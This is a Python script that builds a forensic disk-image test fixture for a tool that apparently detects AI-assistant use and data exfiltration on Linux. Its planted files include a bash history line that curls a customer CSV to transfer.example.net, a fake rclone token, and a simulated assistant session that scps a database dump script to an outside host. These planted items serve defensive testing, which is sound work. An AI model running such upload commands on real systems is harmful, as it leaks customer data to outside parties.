from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import tempfile
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
IMAGES_DIR = REPO_ROOT / "tests" / "fixtures" / "images"
EXPECTED_PATH = REPO_ROOT / "tests" / "fixtures" / "expected" / "linux.json"
IMAGE_BASENAME = "linux"
IMAGE_SIZE = "32M"


def _utc(year: int, month: int, day: int, hour: int = 0, minute: int = 0, second: int = 0) -> int:
    return int(datetime(year, month, day, hour, minute, second, tzinfo=UTC).timestamp())


SESSION_ID = "2222bbbb-0000-0000-0000-000000000002"
T0 = _utc(2026, 10, 3, 1, 0, 0)
DUMP_PY = "import sqlite3\nimport csv\n\nconn = sqlite3.connect('customers.db')\n"


def _jsonl(lines: list[dict[str, object]]) -> str:
    return "".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines)


SESSION_LINES = _jsonl(
    [
        {
            "type": "user",
            "sessionId": SESSION_ID,
            "cwd": "/home/park/app",
            "timestamp": "2026-10-03T01:00:00Z",
            "message": {"role": "user", "content": "고객 DB를 덤프해서 csv로 저장하는 코드"},
        },
        {
            "type": "assistant",
            "sessionId": SESSION_ID,
            "cwd": "/home/park/app",
            "timestamp": "2026-10-03T01:00:30Z",
            "message": {
                "role": "assistant",
                "model": "claude-sonnet-4-5",
                "content": [
                    {
                        "type": "tool_use",
                        "id": "toolu_dump01",
                        "name": "Write",
                        "input": {"file_path": "/home/park/app/dump.py", "content": DUMP_PY},
                    }
                ],
            },
        },
        {
            "type": "assistant",
            "sessionId": SESSION_ID,
            "cwd": "/home/park/app",
            "timestamp": "2026-10-03T01:02:00Z",
            "message": {
                "role": "assistant",
                "model": "claude-sonnet-4-5",
                "content": [
                    {
                        "type": "tool_use",
                        "id": "toolu_scp01",
                        "name": "Bash",
                        "input": {"command": "scp /home/park/app/dump.py park@198.51.100.30:/srv/"},
                    }
                ],
            },
        },
    ]
)

BASH_HISTORY = (
    f"#{T0}\nclaude\n#{T0 + 200}\ncurl -F file=@/home/park/app/customers.csv https://transfer.example.net/upload\n"
)
MANIFEST = json.dumps(
    {
        "schemaVersion": 2,
        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {
            "mediaType": "application/vnd.docker.container.image.v1+json",
            "digest": "sha256:" + "0" * 64,
            "size": 486,
        },
        "layers": [
            {
                "mediaType": "application/vnd.ollama.image.model",
                "digest": "sha256:" + "1" * 64,
                "size": 4661211424,
            }
        ],
    }
)
RCLONE_CONF = '[gdrive]\ntype = drive\ntoken = {"access_token":"ya29.SECRET"}\n'
AUTH_LOG = (
    "Oct  3 01:10:00 lnx sshd[100]: Accepted publickey for park from 198.51.100.20 port 50022 ssh2\n"
)
AIDER_HISTORY = (
    "# aider chat started at 2026-10-03 10:20:00\n\n#### 로그인 기능 추가해줘\n\n"
    "네, 로그인 기능을 추가하겠습니다.\n"
)
OS_RELEASE = 'NAME="Ubuntu"\nVERSION_ID="24.04"\nID=ubuntu\n'
PASSWD = "root:x:0:0:root:/root:/bin/bash\npark:x:1000:1000:park:/home/park:/bin/bash\n"


@dataclass(frozen=True, slots=True)
class PlantedFile:
    path: str
    text: str
    mtime: int = T0


PLANTED: tuple[PlantedFile, ...] = (
    PlantedFile(
        "/home/park/.claude/projects/-home-park-app/2222bbbb-0000-0000-0000-000000000002.jsonl",
        SESSION_LINES,
    ),
    PlantedFile("/home/park/app/dump.py", DUMP_PY, mtime=T0 + 30),
    PlantedFile("/home/park/.bash_history", BASH_HISTORY),
    PlantedFile("/home/park/.ollama/history", "dump the database\n"),
    PlantedFile(
        "/home/park/.ollama/models/manifests/registry.ollama.ai/library/llama3/latest", MANIFEST
    ),
    PlantedFile("/home/park/.config/rclone/rclone.conf", RCLONE_CONF),
    PlantedFile("/var/log/auth.log", AUTH_LOG),
    PlantedFile("/home/park/repo/.aider.chat.history.md", AIDER_HISTORY),
    PlantedFile("/etc/os-release", OS_RELEASE),
    PlantedFile("/etc/hostname", "lnx\n"),
    PlantedFile("/etc/passwd", PASSWD),
)

PLANTED_PATHS: tuple[str, ...] = tuple(item.path for item in PLANTED)

EXPECTED: dict[str, object] = {
    "users": ["park"],
    "tools": ["Claude Code", "Ollama", "Aider"],
    "prompts_contain": ["고객 DB를 덤프해서", "dump the database", "로그인 기능 추가해줘"],
    "deleted_files": [],
    "exfil": ["transfer.example.net", "198.51.100.20", "gdrive", "198.51.100.30"],
    "attributions": {"/home/park/app/dump.py": "ai_generated"},
}


def _stage(root: Path) -> None:
    for item in PLANTED:
        target = root / item.path.lstrip("/")
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(item.text.encode("utf-8"))
        os.utime(target, (item.mtime, item.mtime))
    directories = {parent for item in PLANTED for parent in Path(item.path).parents if parent != Path("/")}
    for directory in sorted(directories, key=lambda p: len(p.parts), reverse=True):
        os.utime(root / directory.relative_to("/"), (T0, T0))


def _require_tool(name: str) -> str:
    path = shutil.which(name)
    if path is None:
        raise FileNotFoundError(f"required host tool not found on PATH: {name}")
    return path


def _run(command: list[str]) -> None:
    result = subprocess.run(command, capture_output=True, text=True, check=False)
    if result.returncode != 0:
        raise RuntimeError(f"{command[0]} failed with exit {result.returncode}: {result.stderr.strip()}")


def build_image(out_dir: Path) -> Path:
    mke2fs = _require_tool("mke2fs")
    ewfacquire = _require_tool("ewfacquire")
    out_dir.mkdir(parents=True, exist_ok=True)
    final = out_dir / f"{IMAGE_BASENAME}.E01"
    final.unlink(missing_ok=True)
    work = Path(tempfile.mkdtemp(prefix="aitrace-linux-"))
    try:
        stage = work / "stage"
        stage.mkdir()
        _stage(stage)
        raw = work / f"{IMAGE_BASENAME}.raw"
        _run(
            [
                mke2fs,
                "-q",
                "-t",
                "ext4",
                "-E",
                "root_owner=0:0",
                "-d",
                str(stage),
                str(raw),
                IMAGE_SIZE,
            ]
        )
        _run(
            [
                ewfacquire,
                "-u",
                "-t",
                str(out_dir / IMAGE_BASENAME),
                "-f",
                "encase6",
                "-c",
                "deflate:fast",
                "-C",
                "AITRACE-LNX",
                "-D",
                "aitrace linux fixture",
                "-E",
                "LNX-001",
                "-e",
                "aitrace",
                "-N",
                "fixture",
                "-d",
                "sha256",
                "-q",
                str(raw),
            ]
        )
    finally:
        shutil.rmtree(work)
    return final


def write_expected(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(EXPECTED, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Build the Linux ext4 E01 fixture (plan Appendix C.3).")
    parser.add_argument("--out-dir", type=Path, default=IMAGES_DIR)
    args = parser.parse_args(argv)
    image = build_image(args.out_dir)
    write_expected(EXPECTED_PATH)
    print(image)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
